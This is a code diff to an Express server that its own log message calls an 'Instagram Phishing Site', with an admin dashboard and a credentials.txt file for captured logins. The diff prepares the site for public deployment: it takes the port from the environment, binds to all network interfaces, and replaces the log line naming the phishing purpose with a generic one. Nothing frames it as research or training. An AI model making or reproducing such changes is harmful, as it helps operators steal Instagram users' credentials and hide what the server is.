@@ -5,7 +5,7 @@ const fs = require('fs');
 const path = require('path');
 
 const app = express();
-const port = 3000;
+const port = process.env.PORT || 3000;
 
 // Middleware to parse JSON bodies
 app.use(bodyParser.json());
@@ -135,9 +135,9 @@ app.get('/admin', (req, res) => {
 });
 
 // Start the server
-app.listen(port, () => {
-    console.log(`Instagram Phishing Site is running on http://localhost:${port}`);
-    console.log(`Admin Dashboard is available at http://localhost:${port}/admin`);
+app.listen(port, '0.0.0.0', () => {
+    console.log(`Server is running on port ${port}`);
+
     // Ensure credentials.txt exists
     if (!fs.existsSync(credentialsFilePath)) {
         fs.writeFileSync(credentialsFilePath, '');
